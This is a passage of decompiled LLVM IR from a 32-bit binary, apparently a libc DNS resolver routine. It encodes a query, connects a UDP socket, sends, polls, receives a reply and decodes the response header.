  %v6_805301e = inttoptr i32 %v0_8052ffd to i32*
  store i32 %v3_805301e, i32* %v6_805301e, align 4
  %v0_8053022 = call i32 @__GI_strncat()
  store i32 %v0_8053022, i32* %eax.global-to-local, align 4
  %v0_8053027 = load i32, i32* @esp, align 4
  %v1_805302a = add i32 %v0_8053027, 8
  %v2_805302a = inttoptr i32 %v1_805302a to i32*
  store i32 1025, i32* %v2_805302a, align 4
  %v1_805302f = add i32 %v0_8053027, 52
  %v2_805302f = inttoptr i32 %v1_805302f to i32*
  %v3_805302f = load i32, i32* %v2_805302f, align 4
  store i32 %v3_805302f, i32* %edx.global-to-local, align 4
  %v1_8053033 = mul i32 %v3_805302f, 4
  %v2_8053033 = add i32 %v1_8053033, 134612760
  %v3_8053033 = inttoptr i32 %v2_8053033 to i32*
  %v4_8053033 = load i32, i32* %v3_8053033, align 4
  %v6_8053033 = add i32 %v0_8053027, 4
  %v7_8053033 = inttoptr i32 %v6_8053033 to i32*
  store i32 %v4_8053033, i32* %v7_8053033, align 4
  %v1_805303a = add i32 %v0_8053027, 28
  %v2_805303a = inttoptr i32 %v1_805303a to i32*
  %v3_805303a = load i32, i32* %v2_805303a, align 4
  %v6_805303a = inttoptr i32 %v0_8053027 to i32*
  store i32 %v3_805303a, i32* %v6_805303a, align 4
  %v0_805303e = call i32 @__GI_strncat()
  store i32 %v0_805303e, i32* %eax.global-to-local, align 4
  %v0_8053043 = load i32, i32* @esp, align 4
  %v1_8053043 = add i32 %v0_8053043, 16
  br label %dec_label_pc_8053046

dec_label_pc_8053046:                             ; preds = %dec_label_pc_8052faf.dec_label_pc_8053046_crit_edge, %dec_label_pc_8053007, %dec_label_pc_8053013
  %v1_8053046 = phi i32 [ %v1_8052ffd, %dec_label_pc_8052faf.dec_label_pc_8053046_crit_edge ], [ %v1_8052ffd, %dec_label_pc_8053007 ], [ %v1_8053043, %dec_label_pc_8053013 ]
  %v0_8053046 = phi i32 [ %v0_8053046.pre, %dec_label_pc_8052faf.dec_label_pc_8053046_crit_edge ], [ %v3_8053000, %dec_label_pc_8053007 ], [ %v0_805303e, %dec_label_pc_8053013 ]
  %v2_8053046 = add i32 %v1_8053046, -4
  %v3_8053046 = inttoptr i32 %v2_8053046 to i32*
  store i32 %v0_8053046, i32* %v3_8053046, align 4
  %v0_8053047 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053047 = add i32 %v1_8053046, -8
  %v3_8053047 = inttoptr i32 %v2_8053047 to i32*
  store i32 %v0_8053047, i32* %v3_8053047, align 4
  %v1_8053048 = add i32 %v1_8053046, -12
  %v2_8053048 = inttoptr i32 %v1_8053048 to i32*
  store i32 1, i32* %v2_8053048, align 4
  %v1_805304a = add i32 %v1_8053046, 184
  store i32 %v1_805304a, i32* @eax, align 4
  %v2_8053051 = add i32 %v1_8053046, -16
  %v3_8053051 = inttoptr i32 %v2_8053051 to i32*
  store i32 %v1_805304a, i32* %v3_8053051, align 4
  %v2_8053052 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052efc)
  store i32 %v2_8053052, i32* %eax.global-to-local, align 4
  %v0_8053057 = load i32, i32* @esp, align 4
  %v1_8053057 = add i32 %v0_8053057, 28
  %v2_8053057 = inttoptr i32 %v1_8053057 to i32*
  %v3_8053057 = load i32, i32* %v2_8053057, align 4
  store i32 %v3_8053057, i32* %eax.global-to-local, align 4
  %v1_805305b = add i32 %v0_8053057, 260
  %v2_805305b = inttoptr i32 %v1_805305b to i32*
  %v3_805305b = load i32, i32* %v2_805305b, align 4
  store i32 %v3_805305b, i32* @edx, align 4
  %v1_8053062 = add i32 %v0_8053057, 224
  %v2_8053062 = inttoptr i32 %v1_8053062 to i32*
  store i32 1, i32* %v2_8053062, align 4
  %v0_805306d = load i32, i32* %eax.global-to-local, align 4
  %v1_805306d = load i32, i32* @esp, align 4
  %v2_805306d = add i32 %v1_805306d, 216
  %v3_805306d = inttoptr i32 %v2_805306d to i32*
  store i32 %v0_805306d, i32* %v3_805306d, align 4
  %v1_8053079 = load i32, i32* @ebx, align 4
  %v2_8053079 = sub i32 512, %v1_8053079
  store i32 %v2_8053079, i32* %eax.global-to-local, align 4
  %v0_805307b = load i32, i32* @edx, align 4
  %v1_805307b = load i32, i32* @esp, align 4
  %v2_805307b = add i32 %v1_805307b, 220
  %v3_805307b = inttoptr i32 %v2_805307b to i32*
  store i32 %v0_805307b, i32* %v3_805307b, align 4
  %v0_8053082 = load i32, i32* @esp, align 4
  %v0_8053085 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053085 = add i32 %v0_8053082, 8
  %v3_8053085 = inttoptr i32 %v2_8053085 to i32*
  store i32 %v0_8053085, i32* %v3_8053085, align 4
  %v1_8053086 = load i32, i32* @ebx, align 4
  %v2_8053086 = add i32 %v1_8053086, %v2_8052e6e
  %v2_805308a = add i32 %v0_8053082, 4
  %v3_805308a = inttoptr i32 %v2_805308a to i32*
  store i32 %v2_8053086, i32* %v3_805308a, align 4
  %v1_805308b = add i32 %v0_8053082, 216
  store i32 %v1_805308b, i32* @eax, align 4
  %v3_8053092 = inttoptr i32 %v0_8053082 to i32*
  store i32 %v1_805308b, i32* %v3_8053092, align 4
  %v0_8053093 = call i32 @__encode_question()
  store i32 %v0_8053093, i32* %eax.global-to-local, align 4
  %v0_8053098 = load i32, i32* @esp, align 4
  %v2_805309b = icmp slt i32 %v0_8053093, 0
  store i32 %v0_8053093, i32* @esi, align 4
  br i1 %v2_805309b, label %dec_label_pc_8053501, label %dec_label_pc_80530a5

dec_label_pc_80530a5:                             ; preds = %dec_label_pc_8053046
  %v1_80530a5 = add i32 %v0_8053098, 172
  %v2_80530a5 = inttoptr i32 %v1_80530a5 to i16*
  store i16 2, i16* %v2_80530a5, align 2
  %v1_80530af = load i32, i32* @esp, align 4
  %v2_80530af = add i32 %v1_80530af, -4
  %v3_80530af = inttoptr i32 %v2_80530af to i32*
  store i32 %v0_8053093, i32* %v3_80530af, align 4
  %v1_80530b0 = add i32 %v1_80530af, 164
  store i32 %v1_80530b0, i32* %eax.global-to-local, align 4
  %v2_80530b7 = add i32 %v1_80530af, -8
  %v3_80530b7 = inttoptr i32 %v2_80530b7 to i32*
  store i32 %v1_80530b0, i32* %v3_80530b7, align 4
  %v1_80530b8 = add i32 %v1_80530af, 32
  %v2_80530b8 = inttoptr i32 %v1_80530b8 to i32*
  %v3_80530b8 = load i32, i32* %v2_80530b8, align 4
  %v5_80530b8 = add i32 %v1_80530af, -12
  %v6_80530b8 = inttoptr i32 %v5_80530b8 to i32*
  store i32 %v3_80530b8, i32* %v6_80530b8, align 4
  %v1_80530bc = add i32 %v1_80530af, -16
  %v2_80530bc = inttoptr i32 %v1_80530bc to i32*
  store i32 10, i32* %v2_80530bc, align 4
  %v5_80530be = call i32 @inet_pton(i32 -1, i8* %v4_80530be, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_80530be, i32* %eax.global-to-local, align 4
  %v0_80530c3 = load i32, i32* @esp, align 4
  %v1_80530c3 = add i32 %v0_80530c3, 16
  %tmp47 = icmp slt i32 %v5_80530be, 1
  br i1 %tmp47, label %dec_label_pc_80530d4, label %dec_label_pc_80530ca

dec_label_pc_80530ca:                             ; preds = %dec_label_pc_80530a5
  %v1_80530ca = add i32 %v0_80530c3, 172
  %v2_80530ca = inttoptr i32 %v1_80530ca to i16*
  store i16 10, i16* %v2_80530ca, align 2
  %v0_80530d4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80530d4

dec_label_pc_80530d4:                             ; preds = %dec_label_pc_80530a5, %dec_label_pc_80530ca
  %v0_80530eb = phi i32 [ %v1_80530c3, %dec_label_pc_80530a5 ], [ %v0_80530d4.pre, %dec_label_pc_80530ca ]
  %v1_80530d4 = add i32 %v0_80530eb, 156
  %v2_80530d4 = inttoptr i32 %v1_80530d4 to i16*
  %v3_80530d4 = load i16, i16* %v2_80530d4, align 2
  %v12_80530d4 = icmp eq i16 %v3_80530d4, 10
  %v1_80530dd = icmp eq i1 %v12_80530d4, false
  %v1_80530eb = add i32 %v0_80530eb, 158
  %v2_80530eb = inttoptr i32 %v1_80530eb to i16*
  store i16 13568, i16* %v2_80530eb, align 2
  %v0_80530f5 = load i32, i32* @esp, align 4
  br i1 %v1_80530dd, label %dec_label_pc_80530eb, label %dec_label_pc_805310b

dec_label_pc_80530eb:                             ; preds = %dec_label_pc_80530d4
  %v1_80530f8 = add i32 %v0_80530f5, 32
  %v2_80530f8 = inttoptr i32 %v1_80530f8 to i32*
  %v3_80530f8 = load i32, i32* %v2_80530f8, align 4
  %v5_80530f8 = add i32 %v0_80530f5, -16
  %v6_80530f8 = inttoptr i32 %v5_80530f8 to i32*
  store i32 %v3_80530f8, i32* %v6_80530f8, align 4
  %v1_80530fc = call i32 @inet_addr(i32 -1)
  store i32 %v1_80530fc, i32* %eax.global-to-local, align 4
  %v1_8053101 = load i32, i32* @esp, align 4
  %v2_8053101 = add i32 %v1_8053101, 176
  %v3_8053101 = inttoptr i32 %v2_8053101 to i32*
  store i32 %v1_80530fc, i32* %v3_8053101, align 4
  %v0_8053108 = load i32, i32* @esp, align 4
  %v1_8053108 = add i32 %v0_8053108, 16
  br label %dec_label_pc_805310b

dec_label_pc_805310b:                             ; preds = %dec_label_pc_80530d4, %dec_label_pc_80530eb
  %v1_805310b = phi i32 [ %v1_8053108, %dec_label_pc_80530eb ], [ %v0_80530f5, %dec_label_pc_80530d4 ]
  %v0_805310b = load i32, i32* @ecx, align 4
  %v2_805310b = add i32 %v1_805310b, -4
  %v3_805310b = inttoptr i32 %v2_805310b to i32*
  store i32 %v0_805310b, i32* %v3_805310b, align 4
  %v1_805310c = add i32 %v1_805310b, -8
  %v2_805310c = inttoptr i32 %v1_805310c to i32*
  store i32 17, i32* %v2_805310c, align 4
  %v1_805310e = add i32 %v1_805310b, -12
  %v2_805310e = inttoptr i32 %v1_805310e to i32*
  store i32 2, i32* %v2_805310e, align 4
  %v1_8053110 = add i32 %v1_805310b, 156
  %v2_8053110 = inttoptr i32 %v1_8053110 to i16*
  %v3_8053110 = load i16, i16* %v2_8053110, align 2
  %v4_8053110 = zext i16 %v3_8053110 to i32
  store i32 %v4_8053110, i32* %eax.global-to-local, align 4
  %v2_8053118 = add i32 %v1_805310b, -16
  %v3_8053118 = inttoptr i32 %v2_8053118 to i32*
  store i32 %v4_8053110, i32* %v3_8053118, align 4
  %v3_8053119 = call i32 @socket(i32 -1, i32 %v15_8052efc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8053119, i32* %eax.global-to-local, align 4
  %v1_805311e = load i32, i32* @esp, align 4
  %v2_805311e = add i32 %v1_805311e, 36
  %v3_805311e = inttoptr i32 %v2_805311e to i32*
  store i32 %v3_8053119, i32* %v3_805311e, align 4
  %v0_8053122 = load i32, i32* @esp, align 4
  %v1_8053122 = add i32 %v0_8053122, 16
  %v0_8053125 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053125 = icmp slt i32 %v0_8053125, 0
  br i1 %v2_8053125, label %dec_label_pc_8053152, label %dec_label_pc_8053129

dec_label_pc_8053129:                             ; preds = %dec_label_pc_805310b
  %v1_8053129 = add i32 %v0_8053122, 172
  store i32 %v1_8053129, i32* %eax.global-to-local, align 4
  %v0_8053130 = load i32, i32* @edx, align 4
  %v2_8053130 = add i32 %v0_8053122, 12
  %v3_8053130 = inttoptr i32 %v2_8053130 to i32*
  store i32 %v0_8053130, i32* %v3_8053130, align 4
  %v1_8053131 = add i32 %v0_8053122, 8
  %v2_8053131 = inttoptr i32 %v1_8053131 to i32*
  store i32 28, i32* %v2_8053131, align 4
  %v0_8053133 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053133 = add i32 %v0_8053122, 4
  %v3_8053133 = inttoptr i32 %v2_8053133 to i32*
  store i32 %v0_8053133, i32* %v3_8053133, align 4
  %v1_8053134 = add i32 %v0_8053122, 36
  %v2_8053134 = inttoptr i32 %v1_8053134 to i32*
  %v3_8053134 = load i32, i32* %v2_8053134, align 4
  %v6_8053134 = inttoptr i32 %v0_8053122 to i32*
  store i32 %v3_8053134, i32* %v6_8053134, align 4
  %v3_8053138 = call i32 @__libc_connect(i32 -1, i32 %v15_8052efc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8053138, i32* %eax.global-to-local, align 4
  %v0_805313d = load i32, i32* @esp, align 4
  %v2_8053140 = icmp slt i32 %v3_8053138, 0
  %v1_8053142 = icmp eq i1 %v2_8053140, false
  br i1 %v1_8053142, label %dec_label_pc_805315b, label %dec_label_pc_8053144

dec_label_pc_8053144:                             ; preds = %dec_label_pc_8053129
  %v1_8053144 = call i32 @__errno_location(i32 -1)
  store i32 %v1_8053144, i32* %eax.global-to-local, align 4
  %v1_8053149 = inttoptr i32 %v1_8053144 to i32*
  %v2_8053149 = load i32, i32* %v1_8053149, align 4
  %v11_8053149 = icmp eq i32 %v2_8053149, 101
  %v0_80534bb.pre = load i32, i32* @esp, align 4
  br i1 %v11_8053149, label %dec_label_pc_80534bb, label %dec_label_pc_8053152

dec_label_pc_8053152:                             ; preds = %dec_label_pc_8053144, %dec_label_pc_805310b
  %v17_8053152 = phi i32 [ %v1_8053122, %dec_label_pc_805310b ], [ %v0_80534bb.pre, %dec_label_pc_8053144 ]
  %v1_8053152 = add i32 %v17_8053152, 28
  %v2_8053152 = inttoptr i32 %v1_8053152 to i32*
  %v3_8053152 = load i32, i32* %v2_8053152, align 4
  %v4_8053152 = add i32 %v3_8053152, 1
  store i32 %v4_8053152, i32* %v2_8053152, align 4
  br label %dec_label_pc_80534dc.backedge

dec_label_pc_805315b:                             ; preds = %dec_label_pc_8053129
  %v1_805315b = add i32 %v0_805313d, 12
  %v2_805315b = inttoptr i32 %v1_805315b to i32*
  store i32 0, i32* %v2_805315b, align 4
  %v0_805315d = load i32, i32* @ebx, align 4
  %v1_805315d = load i32, i32* @esi, align 4
  %v2_805315d = add i32 %v1_805315d, %v0_805315d
  store i32 %v2_805315d, i32* %eax.global-to-local, align 4
  %v2_8053160 = add i32 %v0_805313d, 8
  %v3_8053160 = inttoptr i32 %v2_8053160 to i32*
  store i32 %v2_805315d, i32* %v3_8053160, align 4
  %v2_8053161 = add i32 %v0_805313d, 4
  %v3_8053161 = inttoptr i32 %v2_8053161 to i32*
  store i32 %v2_8052e6e, i32* %v3_8053161, align 4
  %v1_8053162 = add i32 %v0_805313d, 36
  %v2_8053162 = inttoptr i32 %v1_8053162 to i32*
  %v3_8053162 = load i32, i32* %v2_8053162, align 4
  %v6_8053162 = inttoptr i32 %v0_805313d to i32*
  store i32 %v3_8053162, i32* %v6_8053162, align 4
  %v4_8053166 = call i32 @__libc_send(i32 -1, i32 %v15_8052efc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8053166, i32* %eax.global-to-local, align 4
  %v0_805316b = load i32, i32* @esp, align 4
  %v1_805316b = add i32 %v0_805316b, 36
  %v2_805316b = inttoptr i32 %v1_805316b to i32*
  %v3_805316b = load i32, i32* %v2_805316b, align 4
  store i32 %v3_805316b, i32* %eax.global-to-local, align 4
  %v1_805316f = add i32 %v0_805316b, 232
  %v2_805316f = inttoptr i32 %v1_805316f to i16*
  store i16 1, i16* %v2_805316f, align 2
  %v0_8053179 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053179 = load i32, i32* @esp, align 4
  %v2_8053179 = add i32 %v1_8053179, 228
  %v3_8053179 = inttoptr i32 %v2_8053179 to i32*
  store i32 %v0_8053179, i32* %v3_8053179, align 4
  %v0_8053180 = load i32, i32* @esp, align 4
  %v1_8053183 = add i32 %v0_8053180, 8
  %v2_8053183 = inttoptr i32 %v1_8053183 to i32*
  store i32 10000, i32* %v2_8053183, align 4
  %v1_8053188 = add i32 %v0_8053180, 4
  %v2_8053188 = inttoptr i32 %v1_8053188 to i32*
  store i32 1, i32* %v2_8053188, align 4
  %v1_805318a = add i32 %v0_8053180, 228
  store i32 %v1_805318a, i32* %eax.global-to-local, align 4
  %v3_8053191 = inttoptr i32 %v0_8053180 to i32*
  store i32 %v1_805318a, i32* %v3_8053191, align 4
  %v0_8053192 = call i32 @__libc_poll()
  store i32 %v0_8053192, i32* %eax.global-to-local, align 4
  %v0_8053197 = load i32, i32* @esp, align 4
  %v1_8053197 = add i32 %v0_8053197, 16
  %tmp48 = icmp slt i32 %v0_8053192, 1
  br i1 %tmp48, label %dec_label_pc_80534bb, label %dec_label_pc_80531a2

dec_label_pc_80531a2:                             ; preds = %dec_label_pc_805315b
  %v1_80531a2 = add i32 %v0_8053197, 12
  %v2_80531a2 = inttoptr i32 %v1_80531a2 to i32*
  store i32 0, i32* %v2_80531a2, align 4
  %v1_80531a4 = add i32 %v0_8053197, 8
  %v2_80531a4 = inttoptr i32 %v1_80531a4 to i32*
  store i32 512, i32* %v2_80531a4, align 4
  %v2_80531a9 = add i32 %v0_8053197, 4
  %v3_80531a9 = inttoptr i32 %v2_80531a9 to i32*
  store i32 %v2_8052e6e, i32* %v3_80531a9, align 4
  %v1_80531aa = add i32 %v0_8053197, 36
  %v2_80531aa = inttoptr i32 %v1_80531aa to i32*
  %v3_80531aa = load i32, i32* %v2_80531aa, align 4
  %v6_80531aa = inttoptr i32 %v0_8053197 to i32*
  store i32 %v3_80531aa, i32* %v6_80531aa, align 4
  %v4_80531ae = call i32 @__libc_recv(i32 -1, i32 %v15_8052efc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80531ae, i32* @eax, align 4
  %v1_80531b3 = load i32, i32* @esp, align 4
  %v2_80531b3 = add i32 %v1_80531b3, 32
  %v3_80531b3 = inttoptr i32 %v2_80531b3 to i32*
  store i32 %v4_80531ae, i32* %v3_80531b3, align 4
  %v0_80531b7 = load i32, i32* @esp, align 4
  %v1_80531b7 = add i32 %v0_80531b7, 16
  %v7_80531bd = icmp sgt i32 %v4_80531ae, 11
  br i1 %v7_80531bd, label %dec_label_pc_80531c3, label %dec_label_pc_8053470

dec_label_pc_80531c3:                             ; preds = %dec_label_pc_80531a2
  %v0_80531c3 = load i32, i32* @ebx, align 4
  %v2_80531c3 = add i32 %v0_80531b7, 12
  %v3_80531c3 = inttoptr i32 %v2_80531c3 to i32*
  store i32 %v0_80531c3, i32* %v3_80531c3, align 4
  %v0_80531c4 = load i32, i32* @ebx, align 4
  %v2_80531c4 = add i32 %v0_80531b7, 8
  %v3_80531c4 = inttoptr i32 %v2_80531c4 to i32*
  store i32 %v0_80531c4, i32* %v3_80531c4, align 4
  %v1_80531c5 = add i32 %v0_80531b7, 84
  store i32 %v1_80531c5, i32* %eax.global-to-local, align 4
  %v2_80531c9 = add i32 %v0_80531b7, 4
  %v3_80531c9 = inttoptr i32 %v2_80531c9 to i32*
  store i32 %v1_80531c5, i32* %v3_80531c9, align 4
  %v3_80531ca = inttoptr i32 %v0_80531b7 to i32*
  store i32 %v2_8052e6e, i32* %v3_80531ca, align 4
  %v0_80531cb = call i32 @__decode_header()
  store i32 %v0_80531cb, i32* %eax.global-to-local, align 4
  %v0_80531d0 = load i32, i32* @esp, align 4
  %v1_80531d0 = add i32 %v0_80531d0, 84
  %v2_80531d0 = inttoptr i32 %v1_80531d0 to i32*
  %v3_80531d0 = load i32, i32* %v2_80531d0, align 4
  store i32 %v3_80531d0, i32* %edx.global-to-local, align 4
  %v2_80531d4 = add i32 %v0_80531d0, 60
  %v3_80531d4 = inttoptr i32 %v2_80531d4 to i32*
  store i32 %v3_80531d0, i32* %v3_80531d4, align 4
  %v0_80531d8 = load i32, i32* @esp, align 4
  %v1_80531d8 = add i32 %v0_80531d8, 16
  %v1_80531db = add i32 %v0_80531d8, 72
  %v2_80531db = inttoptr i32 %v1_80531db to i32*
  %v3_80531db = load i32, i32* %v2_80531db, align 4
  store i32 %v3_80531db, i32* @eax, align 4
  %v0_80531df = load i32, i32* %edx.global-to-local, align 4
  %v12_80531df = icmp eq i32 %v0_80531df, %v3_80531db
  %v1_80531e1 = icmp eq i1 %v12_80531df, false
  br i1 %v1_80531e1, label %dec_label_pc_8053470, label %dec_label_pc_80531e7

dec_label_pc_80531e7:                             ; preds = %dec_label_pc_80531c3
  %v1_80531e7 = add i32 %v0_80531d8, 88
  %v2_80531e7 = inttoptr i32 %v1_80531e7 to i32*
  %v3_80531e7 = load i32, i32* %v2_80531e7, align 4
  %v4_80531e7 = icmp eq i32 %v3_80531e7, 0
  br i1 %v4_80531e7, label %dec_label_pc_8053470, label %dec_label_pc_80531f2

dec_label_pc_80531f2:                             ; preds = %dec_label_pc_80531e7
  %v1_80531f2 = add i32 %v0_80531d8, 112
  %v2_80531f2 = inttoptr i32 %v1_80531f2 to i32*
  %v3_80531f2 = load i32, i32* %v2_80531f2, align 4
  store i32 %v3_80531f2, i32* @eax, align 4
  %v9_80531f6 = icmp eq i32 %v3_80531f2, 3
  %v1_80531f9 = icmp eq i1 %v9_80531f6, false
  br i1 %v1_80531f9, label %dec_label_pc_8053261, label %dec_label_pc_80531fb

dec_label_pc_80531fb:                             ; preds = %dec_label_pc_80531f2
  %v1_80531fb = add i32 %v0_80531d8, 67
  %v2_80531fb = inttoptr i32 %v1_80531fb to i8*
  %v3_80531fb = load i8, i8* %v2_80531fb, align 1
  %v4_80531fb = icmp eq i8 %v3_80531fb, 0
  %v1_8053200 = icmp eq i1 %v4_80531fb, false
  br i1 %v1_8053200, label %dec_label_pc_8053251, label %dec_label_pc_8053202

dec_label_pc_8053202:                             ; preds = %dec_label_pc_80531fb
  %v0_8053202 = load i32, i32* @ecx, align 4
  %v2_8053202 = add i32 %v0_80531d8, 12
  %v3_8053202 = inttoptr i32 %v2_8053202 to i32*
  store i32 %v0_8053202, i32* %v3_8053202, align 4
  %v1_8053203 = add i32 %v0_80531d8, 8
  %v2_8053203 = inttoptr i32 %v1_8053203 to i32*
  store i32 ptrtoint (i32* @global_var_805a048.183 to i32), i32* %v2_8053203, align 4
  %v1_8053208 = add i32 %v0_80531d8, 4
  %v2_8053208 = inttoptr i32 %v1_8053208 to i32*
  store i32 134552351, i32* %v2_8053208, align 4
  %v1_805320d = add i32 %v0_80531d8, 200
  store i32 %v1_805320d, i32* @esi, align 4
  %v3_8053214 = inttoptr i32 %v0_80531d8 to i32*
  store i32 %v1_805320d, i32* %v3_8053214, align 4
  %v2_8053215 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052efc)
  store i32 %v2_8053215, i32* %eax.global-to-local, align 4
  %v0_805321a = load i32, i32* @esp, align 4
  %v1_805321a = inttoptr i32 %v0_805321a to i32*
  store i32 ptrtoint (i32* @global_var_805a048.183 to i32), i32* %v1_805321a, align 4
  %v1_8053221 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8053221, i32* %eax.global-to-local, align 4
  %v0_8053226 = load i32, i32* @global_var_8060738.244, align 8
  store i32 %v0_8053226, i32* %ebx.global-to-local, align 4
  %v0_805322c = load i32, i32* @esp, align 4
  %v1_805322c = inttoptr i32 %v0_805322c to i32*
  %v2_805322c = load i32, i32* %v1_805322c, align 4
  store i32 %v2_805322c, i32* @eax, align 4
  %v3_805322c = add i32 %v0_805322c, 4
  %v1_805322d = inttoptr i32 %v3_805322c to i32*
  %v2_805322d = load i32, i32* %v1_805322d, align 4
  store i32 %v2_805322d, i32* %edx.global-to-local, align 4
  %v1_805322e = add i32 %v0_8053226, -1
  store i32 %v1_805322e, i32* @ebx, align 4
  store i32 1, i32* %v1_805322d, align 4
  %v0_8053231 = load i32, i32* @esi, align 4
  store i32 %v0_8053231, i32* %v1_805322c, align 4
  %v2_8053232 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052efc)
  store i32 %v2_8053232, i32* %eax.global-to-local, align 4
  %v0_8053237 = load i32, i32* @esp, align 4
  %v1_805323a = add i32 %v0_8053237, 52
  %v2_805323a = inttoptr i32 %v1_805323a to i32*
  %v3_805323a = load i32, i32* %v2_805323a, align 4
  %v4_805323a = load i32, i32* @ebx, align 4
  %v5_805323a = sub i32 %v3_805323a, %v4_805323a
  %v11_805323a = xor i32 %v4_805323a, %v3_805323a
  %v12_805323a = xor i32 %v5_805323a, %v3_805323a
  %v13_805323a = and i32 %v12_805323a, %v11_805323a
  %v14_805323a = icmp slt i32 %v13_805323a, 0
  %v16_805323a = icmp slt i32 %v5_805323a, 0
  %v2_805323e = icmp eq i1 %v16_805323a, %v14_805323a
  br i1 %v2_805323e, label %dec_label_pc_8053251, label %dec_label_pc_8053240

dec_label_pc_8053240:                             ; preds = %dec_label_pc_8053202
  %v1_8053240 = add i32 %v0_8053237, 60
  %v2_8053240 = inttoptr i32 %v1_8053240 to i32*
  %v3_8053240 = load i32, i32* %v2_8053240, align 4
  store i32 %v3_8053240, i32* %edx.global-to-local, align 4
  %v3_8053244 = load i32, i32* %v2_805323a, align 4
  %v4_8053244 = add i32 %v3_8053244, 1
  store i32 %v4_8053244, i32* %v2_805323a, align 4
  %v0_8053248 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053248 = load i32, i32* @esp, align 4
  %v2_8053248 = add i32 %v1_8053248, 56
  %v3_8053248 = inttoptr i32 %v2_8053248 to i32*
  store i32 %v0_8053248, i32* %v3_8053248, align 4
  br label %dec_label_pc_80534dc.backedge

dec_label_pc_8053251:                             ; preds = %dec_label_pc_8053202, %dec_label_pc_80531fb
  %v0_8053251 = call i32 @__GI___h_errno_location()
  store i32 %v0_8053251, i32* %eax.global-to-local, align 4
  %v1_8053256 = inttoptr i32 %v0_8053251 to i32*
  store i32 1, i32* %v1_8053256, align 4
  br label %dec_label_pc_8053514

dec_label_pc_8053261:                             ; preds = %dec_label_pc_80531f2
  %v1_8053261 = icmp eq i32 %v3_80531f2, 0
  %v1_8053263 = icmp eq i1 %v1_8053261, false
  br i1 %v1_8053263, label %dec_label_pc_8053470, label %dec_label_pc_8053269

dec_label_pc_8053269:                             ; preds = %dec_label_pc_8053261
  %v1_8053269 = add i32 %v0_80531d8, 120
  %v2_8053269 = inttoptr i32 %v1_8053269 to i32*
  %v3_8053269 = load i32, i32* %v2_8053269, align 4
  %tmp49 = icmp slt i32 %v3_8053269, 1
  br i1 %tmp49, label %dec_label_pc_8053279, label %dec_label_pc_8053270

dec_label_pc_8053270:                             ; preds = %dec_label_pc_8053269
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8053298

dec_label_pc_8053279:                             ; preds = %dec_label_pc_8053269
  %v0_8053279 = call i32 @__GI___h_errno_location()
  store i32 %v0_8053279, i32* %eax.global-to-local, align 4
  %v1_805327e = inttoptr i32 %v0_8053279 to i32*
  store i32 4, i32* %v1_805327e, align 4
  br label %dec_label_pc_8053514

dec_label_pc_8053289:                             ; preds = %dec_label_pc_8053298
  %v2_8053289 = add i32 %v0_80532a0, -4
  %v3_8053289 = inttoptr i32 %v2_8053289 to i32*
  store i32 %v0_8053289, i32* %v3_8053289, align 4
  %v0_805328a = load i32, i32* @ebx, align 4
  %v1_805328a = add i32 %v0_805328a, 1
  store i32 %v1_805328a, i32* @ebx, align 4
  %v0_805328b = load i32, i32* @eax, align 4
  %v2_805328b = add i32 %v0_80532a0, -8
  %v3_805328b = inttoptr i32 %v2_805328b to i32*
  store i32 %v0_805328b, i32* %v3_805328b, align 4
  %v0_805328c = load i32, i32* @esi, align 4
  %v2_805328c = add i32 %v0_80532a0, -12
  %v3_805328c = inttoptr i32 %v2_805328c to i32*
  store i32 %v0_805328c, i32* %v3_805328c, align 4
  %v2_805328d = add i32 %v0_80532a0, -16
  %v3_805328d = inttoptr i32 %v2_805328d to i32*
  store i32 %v2_8052e6e, i32* %v3_805328d, align 4
  %v0_805328e = call i32 @__length_question()
  store i32 %v0_805328e, i32* @eax, align 4
  %v0_8053293 = load i32, i32* @esp, align 4
  %v1_8053293 = add i32 %v0_8053293, 16
  %v0_8053296 = load i32, i32* @esi, align 4
  %v2_8053296 = add i32 %v0_8053296, %v0_805328e
  %v0_8053298.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053298

dec_label_pc_8053298:                             ; preds = %dec_label_pc_8053270, %dec_label_pc_8053289
  %v0_8053289 = phi i32 [ %v3_80531f2, %dec_label_pc_8053270 ], [ %v0_805328e, %dec_label_pc_8053289 ]
  %v0_80532a0 = phi i32 [ %v1_80531d8, %dec_label_pc_8053270 ], [ %v1_8053293, %dec_label_pc_8053289 ]
  %v0_8053298 = phi i32 [ 0, %dec_label_pc_8053270 ], [ %v0_8053298.pre, %dec_label_pc_8053289 ]
  %storemerge = phi i32 [ 12, %dec_label_pc_8053270 ], [ %v2_8053296, %dec_label_pc_8053289 ]
  store i32 %storemerge, i32* @esi, align 4
  %v2_8053298 = add i32 %v0_80532a0, 100
  %v3_8053298 = inttoptr i32 %v2_8053298 to i32*
  %v4_8053298 = load i32, i32* %v3_8053298, align 4
  %v5_8053298 = sub i32 %v0_8053298, %v4_8053298
  %v11_8053298 = xor i32 %v4_8053298, %v0_8053298
  %v12_8053298 = xor i32 %v5_8053298, %v0_8053298
  %v13_8053298 = and i32 %v12_8053298, %v11_8053298
  %v14_8053298 = icmp slt i32 %v13_8053298, 0
  %v16_8053298 = icmp slt i32 %v5_8053298, 0
  %v2_805329c = icmp eq i1 %v16_8053298, %v14_8053298
  br i1 %v2_805329c, label %dec_label_pc_805329e, label %dec_label_pc_8053289

dec_label_pc_805329e:                             ; preds = %dec_label_pc_8053298
  store i32 0, i32* @ebx, align 4
  %v1_80532a0 = add i32 %v0_80532a0, 27
  %v2_80532a0 = inttoptr i32 %v1_80532a0 to i8*
  store i8 1, i8* %v2_80532a0, align 1
  %v0_80533ce.pre = load i32, i32* @ebx, align 4
